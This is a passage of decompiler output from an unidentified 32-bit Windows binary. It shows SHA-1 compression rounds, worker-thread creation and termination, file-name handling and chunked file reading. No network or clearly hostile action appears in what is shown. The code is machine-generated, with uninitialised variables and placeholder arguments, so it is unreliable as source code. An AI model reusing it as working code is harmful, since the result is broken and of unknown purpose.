    uint32_t v149 = v147 + 0x6ed9eba1 + v136 + (v144 ^ v140 ^ v141) + (v145 / 0x8000000 | 32 * v145); // 0x408cec
    int32_t v150 = v95 ^ v86 ^ v119 ^ v139; // 0x408cfa
    int32_t v151 = 2 * v150 | (int32_t)(v150 < 0); // 0x408d08
    int32_t v152 = v145 / 4 | 0x40000000 * v145; // 0x408d11
    uint32_t v153 = v151 + 0x6ed9eba1 + v140 + (v148 ^ v144 ^ v145) + (v149 / 0x8000000 | 32 * v149); // 0x408d17
    int32_t v154 = v91 ^ v99 ^ v123 ^ v143; // 0x408d21
    int32_t v155 = 2 * v154 | (int32_t)(v154 < 0); // 0x408d29
    int32_t v156 = v149 / 4 | 0x40000000 * v149; // 0x408d3c
    uint32_t v157 = v155 - 0x70e44324 + v144 + ((v149 | v152) & v148 | v149 & v152) + (v153 / 0x8000000 | 32 * v153); // 0x408d4b
    int32_t v158 = v95 ^ v103 ^ v127 ^ v147; // 0x408d58
    int32_t v159 = 2 * v158 | (int32_t)(v158 < 0); // 0x408d5b
    uint32_t v160 = v159 - 0x70e44324 + v148 + ((v153 | v156) & v152 | v153 & v156) + (v157 / 0x8000000 | 32 * v157); // 0x408d82
    int32_t v161 = v107 ^ v99 ^ v131 ^ v151; // 0x408d8f
    int32_t v162 = 2 * v161 | (int32_t)(v161 < 0); // 0x408d92
    int32_t v163 = v153 / 4 | 0x40000000 * v153; // 0x408d9f
    int32_t v164 = v103 ^ v110 ^ v135 ^ v155; // 0x408dbc
    int32_t v165 = 2 * v164 | (int32_t)(v164 < 0); // 0x408dc2
    uint32_t v166 = v162 - 0x70e44324 + v152 + ((v157 | v163) & v156 | v157 & v163) + (v160 / 0x8000000 | 32 * v160); // 0x408dc9
    int32_t v167 = v157 / 4 | 0x40000000 * v157; // 0x408dd3
    uint32_t v168 = v165 - 0x70e44324 + v156 + ((v160 | v167) & v163 | v160 & v167) + (v166 / 0x8000000 | 32 * v166); // 0x408df5
    int32_t v169 = v160 / 4 | 0x40000000 * v160; // 0x408df7
    int32_t v170 = v107 ^ v115 ^ v139 ^ v159; // 0x408e05
    int32_t v171 = 2 * v170 | (int32_t)(v170 < 0); // 0x408e08
    uint32_t v172 = v171 - 0x70e44324 + v163 + ((v166 | v169) & v167 | v166 & v169) + (v168 / 0x8000000 | 32 * v168); // 0x408e2f
    int32_t v173 = v119 ^ v110 ^ v143 ^ v162; // 0x408e3c
    int32_t v174 = 2 * v173 | (int32_t)(v173 < 0); // 0x408e3f
    int32_t v175 = v166 / 4 | 0x40000000 * v166; // 0x408e44
    int32_t v176 = v168 / 4 | 0x40000000 * v168; // 0x408e63
    uint32_t v177 = v174 - 0x70e44324 + v167 + ((v168 | v175) & v169 | v168 & v175) + (v172 / 0x8000000 | 32 * v172); // 0x408e6c
    int32_t v178 = v115 ^ v123 ^ v147 ^ v165; // 0x408e79
    int32_t v179 = 2 * v178 | (int32_t)(v178 < 0); // 0x408e7c
    uint32_t v180 = v179 - 0x70e44324 + v169 + ((v172 | v176) & v175 | v172 & v176) + (v177 / 0x8000000 | 32 * v177); // 0x408ea9
    int32_t v181 = v172 / 4 | 0x40000000 * v172; // 0x408eab
    int32_t v182 = v119 ^ v127 ^ v151 ^ v171; // 0x408eb9
    int32_t v183 = 2 * v182 | (int32_t)(v182 < 0); // 0x408ebc
    int32_t v184 = v131 ^ v123 ^ v155 ^ v174; // 0x408edd
    int32_t v185 = 2 * v184 | (int32_t)(v184 < 0); // 0x408ee3
    uint32_t v186 = v183 - 0x70e44324 + v175 + ((v177 | v181) & v176 | v177 & v181) + (v180 / 0x8000000 | 32 * v180); // 0x408eea
    int32_t v187 = v177 / 4 | 0x40000000 * v177; // 0x408ef4
    uint32_t v188 = v185 - 0x70e44324 + v176 + ((v180 | v187) & v181 | v180 & v187) + (v186 / 0x8000000 | 32 * v186); // 0x408f16
    int32_t v189 = v180 / 4 | 0x40000000 * v180; // 0x408f18
    int32_t v190 = v127 ^ v135 ^ v159 ^ v179; // 0x408f26
    int32_t v191 = 2 * v190 | (int32_t)(v190 < 0); // 0x408f29
    uint32_t v192 = v191 - 0x70e44324 + v181 + ((v186 | v189) & v187 | v186 & v189) + (v188 / 0x8000000 | 32 * v188); // 0x408f50
    int32_t v193 = v131 ^ v139 ^ v162 ^ v183; // 0x408f5b
    int32_t v194 = v186 / 4 | 0x40000000 * v186; // 0x408f5e
    int32_t v195 = 2 * v193 | (int32_t)(v193 < 0); // 0x408f61
    int32_t v196 = v188 / 4 | 0x40000000 * v188; // 0x408f84
    uint32_t v197 = v195 - 0x70e44324 + v187 + ((v188 | v194) & v189 | v188 & v194) + (v192 / 0x8000000 | 32 * v192); // 0x408f8d
    int32_t v198 = v143 ^ v135 ^ v165 ^ v185; // 0x408f9a
    int32_t v199 = 2 * v198 | (int32_t)(v198 < 0); // 0x408f9d
    uint32_t v200 = v199 - 0x70e44324 + v189 + ((v192 | v196) & v194 | v192 & v196) + (v197 / 0x8000000 | 32 * v197); // 0x408fc7
    int32_t v201 = v139 ^ v147 ^ v171 ^ v191; // 0x408fd7
    int32_t v202 = 2 * v201 | (int32_t)(v201 < 0); // 0x408fda
    int32_t v203 = v192 / 4 | 0x40000000 * v192; // 0x408fe7
    int32_t v204 = v143 ^ v151 ^ v174 ^ v195; // 0x408ffe
    int32_t v205 = 2 * v204 | (int32_t)(v204 < 0); // 0x409006
    uint32_t v206 = v202 - 0x70e44324 + v194 + ((v197 | v203) & v196 | v197 & v203) + (v200 / 0x8000000 | 32 * v200); // 0x40900b
    int32_t v207 = v197 / 4 | 0x40000000 * v197; // 0x409012
    int32_t v208 = v200 / 4 | 0x40000000 * v200; // 0x409031
    uint32_t v209 = v205 - 0x70e44324 + v196 + ((v200 | v207) & v203 | v200 & v207) + (v206 / 0x8000000 | 32 * v206); // 0x40903a
    int32_t v210 = v155 ^ v147 ^ v179 ^ v199; // 0x409048
    int32_t v211 = 2 * v210 | (int32_t)(v210 < 0); // 0x40904d
    int32_t v212 = v206 / 4 | 0x40000000 * v206; // 0x409071
    uint32_t v213 = v211 - 0x70e44324 + v203 + ((v206 | v208) & v207 | v206 & v208) + (v209 / 0x8000000 | 32 * v209); // 0x409074
    int32_t v214 = v151 ^ v159 ^ v183 ^ v202; // 0x409081
    int32_t v215 = 2 * v214 | (int32_t)(v214 < 0); // 0x409084
    int32_t v216 = v209 / 4 | 0x40000000 * v209; // 0x4090a5
    uint32_t v217 = v215 - 0x70e44324 + v207 + ((v209 | v212) & v208 | v209 & v212) + (v213 / 0x8000000 | 32 * v213); // 0x4090b1
    int32_t v218 = v155 ^ v162 ^ v185 ^ v205; // 0x4090be
    int32_t v219 = 2 * v218 | (int32_t)(v218 < 0); // 0x4090c1
    int32_t v220 = v213 / 4 | 0x40000000 * v213; // 0x4090dd
    uint32_t v221 = v219 - 0x70e44324 + v208 + ((v213 | v216) & v212 | v213 & v216) + (v217 / 0x8000000 | 32 * v217); // 0x4090e9
    int32_t v222 = v165 ^ v159 ^ v191 ^ v211; // 0x4090f6
    int32_t v223 = 2 * v222 | (int32_t)(v222 < 0); // 0x4090f9
    int32_t v224 = v217 / 4 | 0x40000000 * v217; // 0x40910f
    uint32_t v225 = v223 - 0x70e44324 + v212 + ((v217 | v220) & v216 | v217 & v220) + (v221 / 0x8000000 | 32 * v221); // 0x409123
    int32_t v226 = v162 ^ v171 ^ v195 ^ v215; // 0x40912d
    int32_t v227 = 2 * v226 | (int32_t)(v226 < 0); // 0x409137
    int32_t v228 = v165 ^ v174 ^ v199 ^ v219; // 0x40914e
    int32_t v229 = 2 * v228 | (int32_t)(v228 < 0); // 0x409151
    int32_t v230 = v221 / 4 | 0x40000000 * v221; // 0x409159
    uint32_t v231 = v227 - 0x70e44324 + v216 + ((v221 | v224) & v220 | v221 & v224) + (v225 / 0x8000000 | 32 * v225); // 0x409169
    int32_t v232 = v179 ^ v171 ^ v202 ^ v223; // 0x409188
    int32_t v233 = 2 * v232 | (int32_t)(v232 < 0); // 0x409191
    uint32_t v234 = v229 - 0x70e44324 + v220 + ((v225 | v230) & v224 | v225 & v230) + (v231 / 0x8000000 | 32 * v231); // 0x409193
    int32_t v235 = v225 / 4 | 0x40000000 * v225; // 0x40919a
    int32_t v236 = v231 / 4 | 0x40000000 * v231; // 0x4091b5
    uint32_t v237 = v233 - 0x359d3e2a + v224 + (v235 ^ v230 ^ v231) + (v234 / 0x8000000 | 32 * v234); // 0x4091b8
    int32_t v238 = v174 ^ v183 ^ v205 ^ v227; // 0x4091c8
    int32_t v239 = 2 * v238 | (int32_t)(v238 < 0); // 0x4091cb
    int32_t v240 = v234 / 4 | 0x40000000 * v234; // 0x4091d9
    uint32_t v241 = v239 - 0x359d3e2a + v230 + (v236 ^ v235 ^ v234) + (v237 / 0x8000000 | 32 * v237); // 0x4091e8
    int32_t v242 = v179 ^ v185 ^ v211 ^ v229; // 0x4091f5
    int32_t v243 = 2 * v242 | (int32_t)(v242 < 0); // 0x4091f8
    uint32_t v244 = v243 - 0x359d3e2a + v235 + (v240 ^ v236 ^ v237) + (v241 / 0x8000000 | 32 * v241); // 0x409212
    int32_t v245 = v237 / 4 | 0x40000000 * v237; // 0x409214
    int32_t v246 = v191 ^ v183 ^ v215 ^ v233; // 0x409222
    int32_t v247 = 2 * v246 | (int32_t)(v246 < 0); // 0x409225
    int32_t v248 = v241 / 4 | 0x40000000 * v241; // 0x409233
    uint32_t v249 = v247 - 0x359d3e2a + v236 + (v245 ^ v240 ^ v241) + (v244 / 0x8000000 | 32 * v244); // 0x409247
    int32_t v250 = v185 ^ v195 ^ v219 ^ v239; // 0x409252
    int32_t v251 = 2 * v250 | (int32_t)(v250 < 0); // 0x409255
    int32_t v252 = v244 / 4 | 0x40000000 * v244; // 0x409271
    uint32_t v253 = v251 - 0x359d3e2a + v240 + (v248 ^ v245 ^ v244) + (v249 / 0x8000000 | 32 * v249); // 0x409274
    int32_t v254 = v191 ^ v199 ^ v223 ^ v243; // 0x409282
    int32_t v255 = 2 * v254 | (int32_t)(v254 < 0); // 0x409285
    int32_t v256 = v249 / 4 | 0x40000000 * v249; // 0x4092a1
    uint32_t v257 = v255 - 0x359d3e2a + v245 + (v252 ^ v248 ^ v249) + (v253 / 0x8000000 | 32 * v253); // 0x4092a4
    int32_t v258 = v202 ^ v195 ^ v227 ^ v247; // 0x4092b2
    int32_t v259 = 2 * v258 | (int32_t)(v258 < 0); // 0x4092b5
    int32_t v260 = v253 / 4 | 0x40000000 * v253; // 0x4092cb
    uint32_t v261 = v259 - 0x359d3e2a + v248 + (v256 ^ v252 ^ v253) + (v257 / 0x8000000 | 32 * v257); // 0x4092d1
    int32_t v262 = v199 ^ v205 ^ v229 ^ v251; // 0x4092dc
    int32_t v263 = 2 * v262 | (int32_t)(v262 < 0); // 0x4092df
    int32_t v264 = v257 / 4 | 0x40000000 * v257; // 0x4092ee
    uint32_t v265 = v263 - 0x359d3e2a + v252 + (v260 ^ v256 ^ v257) + (v261 / 0x8000000 | 32 * v261); // 0x409306
    int32_t v266 = v202 ^ v211 ^ v233 ^ v255; // 0x409311
    int32_t v267 = 2 * v266 | (int32_t)(v266 < 0); // 0x409314
    int32_t v268 = v261 / 4 | 0x40000000 * v261; // 0x409330
    uint32_t v269 = v267 - 0x359d3e2a + v256 + (v264 ^ v260 ^ v261) + (v265 / 0x8000000 | 32 * v265); // 0x409333
    int32_t v270 = v215 ^ v205 ^ v239 ^ v259; // 0x409341
    int32_t v271 = 2 * v270 | (int32_t)(v270 < 0); // 0x409344
    int32_t v272 = v265 / 4 | 0x40000000 * v265; // 0x409360
    uint32_t v273 = v271 - 0x359d3e2a + v260 + (v268 ^ v264 ^ v265) + (v269 / 0x8000000 | 32 * v269); // 0x409363
    int32_t v274 = v211 ^ v219 ^ v243 ^ v263; // 0x409371
    int32_t v275 = 2 * v274 | (int32_t)(v274 < 0); // 0x409377
    int32_t v276 = v269 / 4 | 0x40000000 * v269; // 0x40938d
    uint32_t v277 = v275 - 0x359d3e2a + v264 + (v272 ^ v268 ^ v269) + (v273 / 0x8000000 | 32 * v273); // 0x40939b
    int32_t v278 = v215 ^ v223 ^ v247 ^ v267; // 0x4093a2
    int32_t v279 = 2 * v278 | (int32_t)(v278 < 0); // 0x4093a5
    uint32_t v280 = v279 - 0x359d3e2a + v268 + (v276 ^ v272 ^ v273) + (v277 / 0x8000000 | 32 * v277); // 0x4093bf
    int32_t v281 = v273 / 4 | 0x40000000 * v273; // 0x4093c7
    int32_t v282 = v227 ^ v219 ^ v251 ^ v271; // 0x4093d0
    int32_t v283 = 2 * v282 | (int32_t)(v282 < 0); // 0x4093d3
    uint32_t v284 = v283 - 0x359d3e2a + v272 + (v281 ^ v276 ^ v277) + (v280 / 0x8000000 | 32 * v280); // 0x4093f7
    int32_t v285 = v223 ^ v229 ^ v255 ^ v275; // 0x4093ff
    int32_t v286 = v277 / 4 | 0x40000000 * v277; // 0x409408
    int32_t v287 = 2 * v285 | (int32_t)(v285 < 0); // 0x409412
    uint32_t v288 = v287 - 0x359d3e2a + v276 + (v286 ^ v281 ^ v280) + (v284 / 0x8000000 | 32 * v284); // 0x409424
    int32_t v289 = v280 / 4 | 0x40000000 * v280; // 0x409426
    int32_t v290 = v227 ^ v233 ^ v259 ^ v279; // 0x40943c
    int32_t v291 = 2 * v290 | (int32_t)(v290 < 0); // 0x409442
    int32_t v292 = v284 / 4 | 0x40000000 * v284; // 0x409446
    uint32_t v293 = v291 - 0x359d3e2a + v281 + (v289 ^ v286 ^ v284) + (v288 / 0x8000000 | 32 * v288); // 0x409454
    int32_t v294 = v239 ^ v229 ^ v263 ^ v283; // 0x409461
    int32_t v295 = 2 * v294 | (int32_t)(v294 < 0); // 0x409464
    uint32_t v296 = v295 - 0x359d3e2a + v286 + (v292 ^ v289 ^ v288) + (v293 / 0x8000000 | 32 * v293); // 0x40947f
    int32_t v297 = v288 / 4 | 0x40000000 * v288; // 0x409481
    int32_t v298 = v233 ^ v243 ^ v267 ^ v287; // 0x40948d
    int32_t v299 = 2 * v298 | (int32_t)(v298 < 0); // 0x409490
    uint32_t v300 = v299 - 0x359d3e2a + v289 + (v297 ^ v292 ^ v293) + (v296 / 0x8000000 | 32 * v296); // 0x4094b2
    int32_t v301 = v239 ^ v247 ^ v271 ^ v291; // 0x4094bc
    int32_t v302 = v293 / 4 | 0x40000000 * v293; // 0x4094c9
    int32_t v303 = v296 / 4 | 0x40000000 * v296; // 0x4094ce
    uint32_t v304 = (2 * v301 | (int32_t)(v301 < 0)) - 0x359d3e2a + v292 + (v302 ^ v297 ^ v296) + (v300 / 0x8000000 | 32 * v300); // 0x4094e6
    int32_t v305 = v251 ^ v243 ^ v275 ^ v295; // 0x4094f2
    int32_t v306 = v300 / 4 | 0x40000000 * v300; // 0x409505
    uint32_t v307 = (2 * v305 | (int32_t)(v305 < 0)) - 0x359d3e2a + v297 + (v303 ^ v302 ^ v300) + (v304 / 0x8000000 | 32 * v304); // 0x40950b
    int32_t v308 = v247 ^ v255 ^ v279 ^ v299; // 0x409515
    int32_t result = 2 * ((2 * v308 | (int32_t)(v308 < 0)) + 0x4a62c1d6 + v302 + (v307 / 0x8000000 | 32 * v307)) + (v306 ^ v303 ^ v304); // 0x40953a
    *v7 = v306 + v8;
    *v9 = (v304 / 4 | 0x40000000 * v304) + *v9;
    *v2 = v307 + *v2;
    *v6 = v303 + *v6;
    *(int32_t *)v1 = result;
    return result;
}

// Address range: 0x409554 - 0x409597
int32_t function_409554(int32_t a1) {
    // 0x409554
    function_40844f();
    int32_t v1; // 0x409554
    int32_t result; // 0x409589
    if (a1 == 0) {
        // 0x409584
        result = function_408316();
        *(char *)(v1 + 20) = 0;
        return result;
    }
    int32_t v2 = 0; // 0x40957d
    int32_t v3; // bp-108, 0x409554
    *(int32_t *)((int32_t)&v3 - 4) = 1;
    function_4083af((char)&g322);
    while (v2 + 1 != a1) {
        // 0x409570
        v2++;
        *(int32_t *)((int32_t)&v3 - 4) = 1;
        function_4083af((char)&g322);
    }
    // 0x409584
    result = function_408316();
    *(char *)(v1 + 20) = 0;
    return result;
}

// Address range: 0x409597 - 0x4095aa
int32_t function_409597(void) {
    // 0x409597
    function_41405b();
    return function_4026c6();
}

// Address range: 0x4095aa - 0x409796
int32_t function_4095aa(int32_t a1) {
    int32_t * v1 = (int32_t *)(a1 + 20); // 0x4095bd
    int16_t * v2 = (int16_t *)*v1; // 0x4095bd
    int16_t * v3 = v2; // bp-148, 0x4095bd
    function_40460a(v2);
    function_409ab4((int32_t)&g322);
    int32_t v4; // 0x4095aa
    int32_t v5; // 0x4095aa
    int32_t v6; // 0x4095aa
    if (v6 == 0) {
        int32_t v7 = *(int32_t *)(a1 + 24); // 0x4096ef
        function_40460a(PathFindFileNameW((int16_t *)*v1));
        int32_t v8 = function_405168(v7, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322); // 0x409732
        int32_t v9 = v8; // bp-192, 0x409737
        function_405f32((int32_t *)v8);
        function_4050ca();
        v5 = &v9;
    } else {
        int32_t v10 = (int32_t)&v3; // 0x4095bd
        int32_t v11 = a1 + 4;
        int32_t v12 = v10; // 0x4095e1
        if (v6 != 0) {
            int32_t * v13 = (int32_t *)v11; // 0x4095e7
            int32_t v14 = 0; // 0x4096db
            int32_t v15 = v10;
            v12 = v15;
            while (*(int32_t *)(*v13 + 12) != 0) {
                int32_t v16 = v14;
                int32_t v17 = v15 + 24; // 0x4095f3
                int32_t * v18 = (int32_t *)v17; // 0x4095f7
                *v18 = 0;
                *(int32_t *)(v15 - 4) = v17;
                *(int32_t *)(v15 - 8) = v16;
                int32_t * v19 = (int32_t *)(v15 + 28); // 0x409601
                *v19 = 0;
                int32_t v20 = function_409a3f((int32_t)&g322, (int32_t)&g322); // 0x409605
                *(int32_t *)(v15 + 12) = *v13;
                *(int32_t *)(v15 + 8) = *(int32_t *)(a1 + 24);
                int32_t v21 = *v1; // 0x409618
                int32_t * v22 = (int32_t *)(v15 - 12);
                int32_t v23; // 0x4095aa
                if (v20 == 0) {
                    // 0x40966f
                    *v22 = 1;
                    *v18 = 0;
                    *(int32_t *)(v15 - 16) = v17;
                    int32_t * v24 = (int32_t *)(v15 - 20); // 0x40967a
                    *v24 = 0;
                    *(int32_t *)(v15 - 24) = 0;
                    *(int32_t *)(v15 - 28) = 0;
                    *(int32_t *)(v15 - 32) = *(int32_t *)(v15 + 108);
                    *v19 = 0;
                    *(int32_t *)(v15 - 36) = v21;
                    *(int32_t *)(v15 - 40) = v21;
                    *(int32_t *)(v15 - 44) = (int32_t)PathFindFileNameW((int16_t *)&g322);
                    function_40460a((int16_t *)&g322);
                    *(int32_t *)(v15 - 48) = *(int32_t *)v15;
                    int32_t v25 = function_405168((int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322); // 0x4096a2
                    int32_t v26 = v15 - 52; // 0x4096ab
                    *(int32_t *)v26 = v25;
                    function_405f32(&g322);
                    function_4050ca();
                    if (*v24 != 0) {
                        // 0x4096c2
                        function_406f66();
                    }
                    // 0x4096c7
                    *v24 = 0;
                    v23 = v26;
                } else {
                    // 0x40961f
                    *v22 = 0;
                    *(int32_t *)(v15 - 16) = v15 + 16;
                    *(int32_t *)(v15 - 20) = *(int32_t *)(v15 + 112);
                    *(int32_t *)(v15 - 24) = *(int32_t *)(v15 + 116);
                    *(int32_t *)(v15 - 28) = v16;
                    *(int32_t *)(v15 - 32) = *(int32_t *)(v15 + 108);
                    *(int32_t *)(v15 - 36) = v21;
                    *(int32_t *)(v15 - 40) = v21;
                    *(int32_t *)(v15 - 44) = (int32_t)PathFindFileNameW((int16_t *)&g322);
                    function_40460a((int16_t *)&g322);
                    *(int32_t *)(v15 - 48) = *(int32_t *)v15;
                    int32_t v27 = function_405168((int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322); // 0x409655
                    int32_t v28 = v15 - 52; // 0x40965e
                    *(int32_t *)v28 = v27;
                    function_405f32(&g322);
                    function_4050ca();
                    v23 = v28;
                }
                int32_t * v29 = (int32_t *)(v23 + 24); // 0x4096cb
                if (*v29 != 0) {
                    // 0x4096d3
                    function_406f66();
                }
                // 0x4096d8
                v14 = v16 + 1;
                *v29 = 0;
                v12 = v23;
                if (v14 >= *(int32_t *)(v23 + 124)) {
                    // break -> 0x4096ea
                    break;
                }
                v15 = v23;
                v12 = v15;
            }
        }
        // 0x4096ea
        v5 = v12;
        v4 = v11;
        if (*(int32_t *)(v12 + 76) != 0) {
            // 0x409762
            function_413ee1();
            v5 = v12;
            v4 = v11;
        }
    }
    // 0x409771
    *(int32_t *)(v5 - 4) = 0;
    *(int32_t *)(v5 - 8) = *(int32_t *)(a1 + 24);
    *(int32_t *)(v5 - 12) = *(int32_t *)v4;
    function_409796((int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
    function_409a0e();
    return 0;
}

// Address range: 0x409796 - 0x4098eb
int32_t function_409796(int32_t a1, int32_t a2, int32_t a3) {
    // 0x409796
    int32_t v1; // bp-96, 0x409796
    int32_t v2 = &v1; // 0x4097a0
    function_414047();
    int32_t v3; // 0x409796
    int32_t * v4 = (int32_t *)(v3 + 8); // 0x4097b1
    int32_t v5 = *v4; // 0x4097b1
    int32_t v6 = v2; // 0x4097bb
    int32_t result = 0; // 0x4097bb
    if (v5 != 0) {
        // 0x4097c4
        bool v7; // 0x409796
        int32_t v8 = v7 ? -4 : 4;
        int32_t hThread; // bp-44, 0x409796
        int32_t v9 = v8 + (int32_t)&hThread;
        int32_t * v10 = (int32_t *)v9;
        int32_t * v11 = (int32_t *)(v9 + v8);
        int32_t v12 = 0; // 0x409796
        function_406d65();
        int32_t v13 = (v5 & -256 | 1) + v12; // 0x4097d1
        hThread = *(int32_t *)v13;
        int32_t v14 = v13 + v8; // 0x4097d6
        *v10 = *(int32_t *)v14;
        *v11 = *(int32_t *)(v14 + v8);
        int32_t v15 = 1; // 0x4097dc
        uint32_t v16 = *v4;
        while (v3 != a2) {
            // 0x4097e7
            v12 += 12;
            v6 = v2;
            result = 0;
            if (v15 >= v16) {
                goto lab_0x4097fc;
            }
            function_406d65();
            v13 = (v16 & -256 | 1) + v12;
            hThread = *(int32_t *)v13;
            v14 = v13 + v8;
            *v10 = *(int32_t *)v14;
            *v11 = *(int32_t *)(v14 + v8);
            v15++;
            v16 = *v4;
        }
        int32_t v17 = a2 & -256 | (int32_t)(v16 != 0); // 0x409813
        function_406d65();
        hThread = *(int32_t *)v17;
        int32_t v18 = v17 + v8; // 0x409828
        *v10 = *(int32_t *)v18;
        *v11 = *(int32_t *)(v18 + v8);
        function_406f1d();
        int32_t v19 = v3 & -256 | (int32_t)(*v4 != 0); // 0x40983c
        function_406d65();
        hThread = *(int32_t *)v19;
        int32_t v20 = v19 + v8; // 0x40984b
        *v10 = *(int32_t *)v20;
        *v11 = *(int32_t *)(v20 + v8);
        int32_t v21 = hThread; // bp-104, 0x409851
        bool v22 = TerminateThread((int32_t *)hThread, 0); // 0x409854
        function_406d65();
        int32_t v23 = 0; // 0x409878
        if (*v4 != 0) {
            int32_t v24 = v15; // 0x40987a
            int32_t v25 = 12 * v15; // 0x40987a
            int32_t v26 = v25 + v24; // 0x40987f
            v24++;
            int32_t v27 = v26 - 12; // 0x409885
            *(int32_t *)v27 = *(int32_t *)v26;
            int32_t v28 = v27 + v8; // 0x409888
            int32_t v29 = v26 + v8; // 0x409888
            *(int32_t *)v28 = *(int32_t *)v29;
            *(int32_t *)(v28 + v8) = *(int32_t *)(v29 + v8);
            uint32_t v30 = *v4; // 0x40988b
            v25 += 12;
            v23 = v30;
            while (v24 <= v30) {
                // 0x40987d
                v26 = v25 + v24;
                v24++;
                v27 = v26 - 12;
                *(int32_t *)v27 = *(int32_t *)v26;
                v28 = v27 + v8;
                v29 = v26 + v8;
                *(int32_t *)v28 = *(int32_t *)v29;
                *(int32_t *)(v28 + v8) = *(int32_t *)(v29 + v8);
                v30 = *v4;
                v25 += 12;
                v23 = v30;
            }
        }
        int32_t v31 = v22; // 0x409854
        *v4 = v23 - 1;
        v6 = &v21;
        result = v31;
        if (a3 != 0) {
            int32_t v32 = 0; // bp-28, 0x4098aa
            int32_t v33 = function_405168(a2, 0, 0, 0, 0, 0, (int32_t)&v32, 3); // 0x4098c0
            int32_t v34 = v33; // bp-140, 0x4098c8
            int32_t v35 = &v34; // 0x4098c8
            function_405f32((int32_t *)v33);
            function_4050ca();
            v6 = v35;
            result = v31;
            if (v32 != 0) {
                // 0x4098e1
                function_406f66();
                v6 = v35;
                result = v31;
            }
        }
    }
  lab_0x4097fc:
    // 0x4097fc
    *(int32_t *)(v6 - 4) = *(int32_t *)(v3 + 16);
    ReleaseMutex(&g322);
    return result;
}

// Address range: 0x4098eb - 0x4099d9
int32_t function_4098eb(int32_t a1, int32_t a2) {
    int32_t lpThreadId = 0; // bp-16, 0x4098f1
    int32_t lpParameter = function_401000(28); // 0x4098fd
    int32_t v1 = a2 + 8; // 0x409912
    __asm_rep_stosd_memset((char *)lpParameter, 0, 7);
    int32_t * v2 = (int32_t *)(a2 + 4); // 0x409917
    *(int32_t *)(lpParameter + 12) = *v2;
    function_4043c7(v1);
    *(int32_t *)(lpParameter + 4) = a1;
    *(int32_t *)(lpParameter + 24) = *v2;
    int32_t v3 = function_401000(520); // 0x40993f
    function_404656(v1);
    function_404656(v1);
    function_40126d((int32_t *)v3, (int32_t *)a2, 2 * function_4045f0() + 2);
    function_406f1d();
    function_406f1d();
    *(int32_t *)(lpParameter + 20) = v3;
    function_414047();
    int32_t * threadHandle = CreateThread(NULL, 0, (int32_t (*)(int32_t *))0x4095aa, (int32_t *)lpParameter, 0, &lpThreadId); // 0x4099ae
    int32_t v4 = (int32_t)threadHandle; // 0x4099ae
    int32_t v5 = v4; // bp-28, 0x4099b7
    int32_t v6 = v4; // bp-88, 0x4099c1
    bool v7; // 0x4098eb
    int32_t v8 = v7 ? -4 : 4; // 0x4099c1
    int32_t v9 = v8 + (int32_t)&v6; // 0x4099c1
    int32_t v10 = v8 + (int32_t)&v5; // 0x4099c1
    *(int32_t *)v9 = *(int32_t *)v10;
    *(int32_t *)(v9 + v8) = *(int32_t *)(v10 + v8);
    function_402612(v6);
    int32_t v11; // 0x4098eb
    return ReleaseMutex((int32_t *)*(int32_t *)(v11 + 16));
}

// Address range: 0x4099d9 - 0x409a0e
int32_t function_4099d9(void) {
    // 0x4099d9
    int32_t result; // 0x4099d9
    *(int32_t *)(result + 12) = 5;
    *(int32_t *)(result + 4) = 5;
    *(int32_t *)(result + 8) = 0;
    int32_t v1 = function_406fa7(); // 0x4099ef
    int32_t v2 = 0; // 0x4099f6
    if (v1 != 0) {
        // 0x4099f8
        *(int32_t *)v1 = 5;
        v2 = v1 + 4;
    }
    // 0x4099fd
    *(int32_t *)result = v2;
    function_414070(64);
    return result;
}

// Address range: 0x409a0e - 0x409a31
int32_t function_409a0e(void) {
    // 0x409a0e
    int32_t v1; // 0x409a0e
    if (v1 != 0) {
        // 0x409a17
        function_413ee1();
    }
    // 0x409a1f
    function_413c16();
    return function_4026e3();
}

// Address range: 0x409a31 - 0x409a3f
int32_t function_409a31(void) {
    // 0x409a31
    int32_t result; // 0x409a31
    if (result == 0) {
        // 0x409a3e
        return result;
    }
    // 0x409a36
    return function_413ee1();
}

// Address range: 0x409a3f - 0x409ab4
int32_t function_409a3f(uint32_t a1, int32_t a2) {
    // 0x409a3f
    int32_t v1; // 0x409a3f
    if (v1 == 0 || *(int32_t *)(v1 + 48) < a1) {
        // 0x409aaf
        return 0;
    }
    int32_t * v2 = (int32_t *)(v1 + 44); // 0x409a52
    uint32_t v3 = *v2; // 0x409a52
    int32_t v4 = v3 * a1; // 0x409a55
    uint32_t v5 = *(int32_t *)(v1 + 40) - v4; // 0x409a5f
    int32_t result; // 0x409a3f
    if (v5 >= v3) {
        // 0x409a9e
        result = function_413b7c(a2, v3, v4);
    } else {
        int32_t v6 = function_413b7c(a2, v5, v4); // 0x409a6c
        int32_t v7 = function_401000(*v2 - v5); // 0x409a7a
        function_403fc7(v7, *v2 - v5);
        function_401014(v7);
        result = v6;
    }
    // 0x409aaf
    return result;
}

// Address range: 0x409ab4 - 0x409b57
int32_t function_409ab4(int32_t a1) {
    int32_t v1 = a1;
    int32_t result; // 0x409ab4
    *(int32_t *)(result + 16) = 5;
    *(int32_t *)(result + 8) = 5;
    *(int32_t *)(result + 12) = 0;
    int32_t v2 = function_406fa7(); // 0x409acd
    int32_t v3 = 0; // 0x409ad4
    if (v2 != 0) {
        // 0x409ad6
        v3 = v2 + 4;
        *(int32_t *)v2 = 5;
        int32_t v4 = v3; // 0x409adb
        int32_t v5 = 5; // 0x409adb
        *(int32_t *)v4 = 0;
        *(int32_t *)(v4 + 4) = 0;
        v5--;
        v4 += 8;
        while (v5 != 0) {
            // 0x409add
            *(int32_t *)v4 = 0;
            *(int32_t *)(v4 + 4) = 0;
            v5--;
            v4 += 8;
        }
    }
    // 0x409aee
    *(int32_t *)(result + 4) = v3;
    function_413fc0();
    *(int32_t *)(result + 44) = 0xffff;
    function_4043c7((int32_t)&v1);
    if (function_413f4f(-0x80000000) == 0) {
        // 0x409b44
        *(int32_t *)result = 0;
        function_406f1d();
        return result;
    }
    uint32_t v6 = *(int32_t *)(result + 40);
    uint32_t v7 = v6 / 0xffff;
    int32_t * v8 = (int32_t *)(result + 48); // 0x409b34
    *v8 = v7;
